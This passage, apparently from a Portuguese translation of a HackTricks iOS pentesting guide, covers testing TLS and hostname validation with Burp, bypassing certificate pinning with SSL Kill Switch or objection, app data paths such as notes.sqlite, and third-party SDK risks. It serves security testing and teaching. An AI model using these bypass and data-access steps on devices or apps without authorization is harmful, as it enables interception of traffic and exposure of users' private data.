√â importante verificar que nenhuma comunica√ß√£o ocorre **sem criptografia** e tamb√©m que o aplicativo est√° corretamente **validando o certificado TLS** do servidor.\
Para verificar esses tipos de problemas, voc√™ pode usar um proxy como o **Burp**:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Verifica√ß√£o de Nome de Host

Um problema comum ao validar o certificado TLS √© verificar se o certificado foi assinado por uma **CA confi√°vel**, mas **n√£o verificar** se **o nome do host** do certificado √© o nome do host sendo acessado.\
Para verificar esse problema usando o Burp, ap√≥s confiar na CA do Burp no iPhone, voc√™ pode **criar um novo certificado com o Burp para um nome de host diferente** e us√°-lo. Se o aplicativo ainda funcionar, ent√£o, algo est√° vulner√°vel.

### Pinning de Certificado

Se um aplicativo estiver usando o Pinning de SSL corretamente, ent√£o o aplicativo s√≥ funcionar√° se o certificado for o esperado. Ao testar um aplicativo **isso pode ser um problema, pois o Burp servir√° seu pr√≥prio certificado.**\
Para contornar essa prote√ß√£o em um dispositivo com jailbreak, voc√™ pode instalar o aplicativo [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) ou instalar [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

Voc√™ tamb√©m pode usar o comando `ios sslpinning disable` do **objection**.

## Diversos

* Em **`/System/Library`** voc√™ pode encontrar os frameworks instalados no telefone usados por aplicativos do sistema.
* Os aplicativos instalados pelo usu√°rio da App Store est√£o localizados em **`/User/Applications`**.
* E **`/User/Library`** cont√©m dados salvos pelos aplicativos de n√≠vel de usu√°rio.
* Voc√™ pode acessar **`/User/Library/Notes/notes.sqlite`** para ler as notas salvas dentro do aplicativo.
* Dentro da pasta de um aplicativo instalado (**`/User/Applications/<APP ID>/`**) voc√™ pode encontrar alguns arquivos interessantes:
  * **`iTunesArtwork`**: O √≠cone usado pelo aplicativo.
  * **`iTunesMetadata.plist`**: Informa√ß√µes do aplicativo usadas na App Store.
  * **`/Library/*`**: Cont√©m as prefer√™ncias e cache. Em **`/Library/Cache/Snapshots/*`** voc√™ pode encontrar o snapshot realizado no aplicativo antes de envi√°-lo para o fundo.

### Atualiza√ß√£o/Corre√ß√£o Remota

Os desenvolvedores podem remotamente **corrigir todas as instala√ß√µes de seu aplicativo instantaneamente** sem ter que ressubmeter o aplicativo para a App Store e esperar at√© que seja aprovado.\
Para esse prop√≥sito, geralmente se usa [**JSPatch**](https://github.com/bang590/JSPatch). Mas h√° outras op√ß√µes tamb√©m, como [Siren](https://github.com/ArtSabintsev/Siren) e [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Este √© um mecanismo perigoso que pode ser abusado por SDKs de terceiros maliciosos, portanto, √© recomendado verificar qual m√©todo √© usado para atualiza√ß√£o autom√°tica (se houver) e test√°-lo.** Voc√™ pode tentar baixar uma vers√£o anterior do aplicativo para esse prop√≥sito.

### Terceiros

Um problema dos SDKs de terceiros √© que n√£o h√° **controle granular sobre os recursos oferecidos pelo SDK**. Voc√™ poderia processar o SDK e ter todos os recursos (incluindo vazamentos de diagn√≥stico e conex√µes HTTP inseguras), ou n√£o us√°-lo. Al√©m disso, geralmente n√£o √© poss√≠vel para os desenvolvedores de aplicativos **corrigir uma vulnerabilidade** no SDK.\
Al√©m disso, alguns SDKs come√ßam a **conter malware uma vez que s√£o muito confi√°veis** pela comunidade.

Al√©m disso, os recursos que esses servi√ßos oferecem podem envolver **servi√ßos de rastreamento para monitorar o comportamento do usu√°rio** enquanto usa o aplicativo, vendendo an√∫ncios em banner ou melhorando a experi√™ncia do usu√°rio. A desvantagem dos servi√ßos de terceiros √© que os desenvolvedores n√£o conhecem os detalhes do c√≥digo executado por meio de bibliotecas de terceiros. Consequentemente, n√£o mais informa√ß√µes do que o necess√°rio devem ser enviadas a um servi√ßo, e nenhuma informa√ß√£o sens√≠vel deve ser divulgada.

A desvantagem √© que um **desenvolvedor n√£o sabe em detalhes que c√≥digo √© executado por meio de bibliotecas de terceiros** e, portanto, perde visibilidade. Consequentemente, deve-se garantir que n√£o mais do que as informa√ß√µes necess√°rias sejam enviadas ao servi√ßo e que nenhuma informa√ß√£o sens√≠vel seja divulgada.

A maioria dos servi√ßos de terceiros √© implementada de duas maneiras:

* com uma biblioteca independente
* com um SDK completo

Todos os dados enviados a servi√ßos de terceiros devem ser anonimizados para evitar a exposi√ß√£o de PII (Informa√ß√µes Pessoais Identific√°veis) que permitiriam que o terceiro identificasse a conta do usu√°rio.

Voc√™ pode encontrar as **bibliotecas usadas por um aplicativo** executando **`otool`** contra o aplicativo (e **executando** **contra** **cada** biblioteca **compartilhada** para encontrar mais bibliotecas compartilhadas usadas).

## **Refer√™ncias**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)

## Mais Informa√ß√µes

* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) Curso gratuito de IOS ([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Vers√£o Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Vers√£o Swift
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
